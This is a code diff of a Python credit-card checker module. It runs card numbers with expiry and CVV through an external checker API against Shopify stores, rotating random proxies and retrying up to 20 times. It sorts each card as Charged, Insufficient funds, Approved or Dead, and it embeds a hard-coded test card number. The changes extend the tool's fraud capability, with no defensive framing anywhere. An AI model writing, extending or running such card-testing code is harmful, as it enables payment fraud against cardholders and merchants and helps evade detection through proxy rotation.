@@ -1,10 +1,11 @@
 import asyncio
 import random
+import time
 
 import aiohttp
 
 from config import CHECKER_API_URL
-from utils.helpers import is_dead_site_error
+from utils.helpers import is_dead_site_error, is_site_dead, get_price_from_response
 
 
 # ─── Card Checking ────────────────────────────────────────────────────────────
@@ -19,6 +20,7 @@ async def check_card(card: str, site: str, proxy: str) -> dict:
         site     : the site used (when available)
         gateway  : gateway name from API
         price    : price from API
+        price_value : float price value
         retry    : True if caller should retry with a different site
     """
     try:
@@ -30,85 +32,129 @@ async def check_card(card: str, site: str, proxy: str) -> dict:
                 "card": card,
             }
 
-        params = {"cc": card, "url": site, "proxy": proxy}
-        timeout = aiohttp.ClientTimeout(total=120)
+        if not site.startswith('http'):
+            site = f'https://{site}'
 
+        proxy_str = None
+        if proxy:
+            proxy_parts = proxy.split(':')
+            if len(proxy_parts) == 4:
+                ip, port, user, password = proxy_parts
+                proxy_str = f"{ip}:{port}:{user}:{password}"
+            elif len(proxy_parts) == 2:
+                ip, port = proxy_parts
+                proxy_str = f"{ip}:{port}"
+            else:
+                proxy_str = proxy
+
+        url = f'{CHECKER_API_URL}?site={site}&cc={card}'
+        if proxy_str:
+            url += f'&proxy={proxy_str}'
+
+        timeout = aiohttp.ClientTimeout(total=100)
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(CHECKER_API_URL, params=params) as resp:
-                raw = await resp.json(content_type=None)
+            async with session.get(url) as resp:
+                if resp.status != 200:
+                    return {
+                        "status": "Site Error",
+                        "message": f"HTTP {resp.status}",
+                        "card": card,
+                        "retry": True,
+                    }
+                try:
+                    raw = await resp.json(content_type=None)
+                except Exception:
+                    text = await resp.text()
+                    return {
+                        "status": "Site Error",
+                        "message": f"Invalid JSON: {text[:100]}",
+                        "card": card,
+                        "retry": True,
+                    }
 
         response_msg = raw.get("Response", "")
         price = raw.get("Price", "-")
-        gate = raw.get("Gate", "shopiii")
-        status = raw.get("Status", "")
+        price_value = get_price_from_response(raw)
+        if price != '-' and price != 0:
+            price_display = f"${price}"
+        else:
+            price_display = '-'
+        gateway = raw.get("Gateway", "Shopify")
 
-        if is_dead_site_error(response_msg):
+        # Use the full is_site_dead check (gateway + price + keywords)
+        if is_site_dead(response_msg, gateway, price_display):
             return {
                 "status": "Site Error",
                 "message": response_msg,
                 "card": card,
                 "retry": True,
-                "gateway": gate,
-                "price": price,
+                "gateway": gateway,
+                "price": price_display,
+                "price_value": price_value,
             }
 
         response_lower = response_msg.lower()
 
-        if status == "Charged" or "order completed" in response_lower or "💎" in response_msg:
+        # Charged detection
+        if any(k in response_lower for k in (
+            'charged', 'order_placed', 'thank you', 'payment successful',
+        )):
             return {
                 "status": "Charged",
                 "message": response_msg,
                 "card": card,
                 "site": site,
-                "gateway": gate,
-                "price": price,
+                "gateway": gateway,
+                "price": price_display,
+                "price_value": price_value,
             }
 
-        if "cloudflare bypass failed" in response_lower:
+        # Insufficient Funds detection
+        _insuff_keywords = ('insufficient_funds', 'insufficient funds', 'insufficient')
+        if any(k in response_lower for k in _insuff_keywords):
             return {
-                "status": "Site Error",
-                "message": "Cloudflare spotted",
-                "card": card,
-                "retry": True,
-                "gateway": gate,
-                "price": price,
-            }
-
-        if "thank you" in response_lower or "payment successful" in response_lower:
-            return {
-                "status": "Charged",
+                "status": "Insuff",
                 "message": response_msg,
                 "card": card,
                 "site": site,
-                "gateway": gate,
-                "price": price,
+                "gateway": gateway,
+                "price": price_display,
+                "price_value": price_value,
             }
 
+        # Approved detection (includes CVV issues, 3DS, etc.)
         _approved_keywords = (
-            "approved", "success",
-            "insufficient_funds", "insufficient funds",
-            "invalid_cvv", "incorrect_cvv", "invalid_cvc", "incorrect_cvc",
-            "invalid cvv", "incorrect cvv", "invalid cvc", "incorrect cvc",
-            "incorrect_zip", "incorrect zip",
+            'approved', 'success',
+            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
+            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
+            'incorrect_zip', 'incorrect zip',
+            'cvv issue', '3d', '3d secure', 'otp',
+            'verification required', 'authenticate',
+            'authentication required', 'challenge required',
+            'redirecting to bank', 'bank verification',
+            'send code', 'enter code', 'verify',
         )
 
-        if status == "Approved" or any(k in response_lower for k in _approved_keywords):
+        if any(k in response_lower for k in _approved_keywords):
             return {
                 "status": "Approved",
                 "message": response_msg,
                 "card": card,
                 "site": site,
-                "gateway": gate,
-                "price": price,
+                "gateway": gateway,
+                "price": price_display,
+                "price_value": price_value,
             }
 
+        # Everything else is Dead (declined)
         return {
             "status": "Dead",
             "message": response_msg,
             "card": card,
             "site": site,
-            "gateway": gate,
-            "price": price,
+            "gateway": gateway,
+            "price": price_display,
+            "price_value": price_value,
         }
 
     except asyncio.TimeoutError:
@@ -120,35 +166,28 @@ async def check_card(card: str, site: str, proxy: str) -> dict:
         }
 
     except Exception as exc:
-        error_msg = str(exc)
-        if is_dead_site_error(error_msg):
-            return {
-                "status": "Site Error",
-                "message": error_msg,
-                "card": card,
-                "retry": True,
-            }
         return {
             "status": "Dead",
-            "message": error_msg,
+            "message": str(exc),
             "card": card,
             "gateway": "Unknown",
             "price": "-",
+            "price_value": 0,
         }
 
 
 async def check_card_with_retry(
     card: str,
-    sites: list[str],
-    proxy: str,
-    max_retries: int = 2,
+    sites: list,
+    proxies: list,
+    max_retries: int = 20,
 ) -> dict:
-    """Attempt to check a card, retrying with a different site on site errors.
+    """Attempt to check a card, retrying with different site/proxy on site errors.
 
     Args:
         card        : card string in ``number|mm|yyyy|cvv`` format
         sites       : list of site URLs to randomly choose from
-        proxy       : proxy string in ``ip:port:user:pass`` format
+        proxies     : list of proxy strings to randomly choose from
         max_retries : maximum number of site attempts before giving up
 
     Returns a result dict (see :func:`check_card`).
@@ -160,40 +199,29 @@ async def check_card_with_retry(
             "card": card,
             "gateway": "Unknown",
             "price": "-",
+            "price_value": 0,
         }
 
-    if not proxy:
+    if not proxies:
         return {
             "status": "Dead",
-            "message": "No proxy configured",
+            "message": "No proxies available",
             "card": card,
             "gateway": "Unknown",
             "price": "-",
+            "price_value": 0,
         }
-
-    last_result = None
 
     for attempt in range(max_retries):
         site = random.choice(sites)
+        proxy = random.choice(proxies)
         result = await check_card(card, site, proxy)
 
         if not result.get("retry"):
             return result
 
-        last_result = result
-
         if attempt < max_retries - 1:
-            await asyncio.sleep(0.3)
-
-    if last_result:
-        return {
-            "status": "Dead",
-            "message": f"Site errors: {last_result['message']}",
-            "card": card,
-            "gateway": last_result.get("gateway", "Unknown"),
-            "price": last_result.get("price", "-"),
-            "site": "Multiple",
-        }
+            await asyncio.sleep(2)
 
     return {
         "status": "Dead",
@@ -201,44 +229,58 @@ async def check_card_with_retry(
         "card": card,
         "gateway": "Unknown",
         "price": "-",
+        "price_value": 0,
     }
 
 
 # ─── Site / Proxy Testing ─────────────────────────────────────────────────────
 
-_TEST_CARD = "5154623245618097|03|2032|156"
-_TEST_SITE = "https://riverbendhomedev.myshopify.com"
+_TEST_CARD = "4031630422575208|01|2030|280"
 
 
 async def test_site(site: str, proxy: str) -> dict:
-    """Test whether a site is alive by running a dummy card through the API.
-
-    Returns ``{'site': site, 'status': 'alive' | 'dead'}``.
-    """
+    """Test whether a site is alive by running a dummy card through the API."""
     try:
-        params = {"cc": _TEST_CARD, "site": site, "proxy": proxy}
+        if not site.startswith('http'):
+            site = f'https://{site}'
+
+        proxy_str = None
+        if proxy:
+            proxy_parts = proxy.split(':')
+            if len(proxy_parts) == 4:
+                ip, port, user, password = proxy_parts
+                proxy_str = f"{ip}:{port}:{user}:{password}"
+            elif len(proxy_parts) == 2:
+                ip, port = proxy_parts
+                proxy_str = f"{ip}:{port}"
+
+        url = f'{CHECKER_API_URL}?site={site}&cc={_TEST_CARD}'
+        if proxy_str:
+            url += f'&proxy={proxy_str}'
+
         timeout = aiohttp.ClientTimeout(total=60)
-
         async with aiohttp.ClientSession(timeout=timeout) as session:
-            async with session.get(CHECKER_API_URL, params=params) as resp:
-                raw = await resp.json(content_type=None)
+            async with session.get(url) as resp:
+                if resp.status != 200:
+                    return {'site': site, 'status': 'dead', 'price': 0.0, 'msg': f'HTTP {resp.status}'}
+                try:
+                    raw = await resp.json(content_type=None)
+                except Exception:
+                    return {'site': site, 'status': 'dead', 'price': 0.0, 'msg': 'Invalid JSON'}
 
-        if "error" in raw:
-            return {"site": site, "status": "dead", "msg": raw.get("error")}
+        response_msg = raw.get('Response', '')
+        gateway = raw.get('Gateway', '')
+        price_display = raw.get('Price', '-')
+        price_value = get_price_from_response(raw)
 
-        response_msg = raw.get("Response", "")
-
-        if is_dead_site_error(response_msg):
-            return {"site": site, "status": "dead", "msg": response_msg}
-
-        price = raw.get("Price", "N/A")
-        return {"site": site, "status": "alive", "msg": response_msg, "price": price}
+        if is_site_dead(response_msg, gateway, price_display):
+            return {'site': site, 'status': 'dead', 'price': 0.0, 'msg': response_msg or 'Site dead'}
+        else:
+            return {'site': site, 'status': 'alive', 'price': price_value, 'msg': response_msg}
 
     except Exception as e:
-        return {"site": site, "status": "dead", "msg": str(e)}
+        return {'site': site, 'status': 'dead', 'price': 0.0, 'msg': str(e)}
 
-
-import time
 
 def get_proxy_url(proxy_str: str) -> str:
     proxy_str = proxy_str.strip()
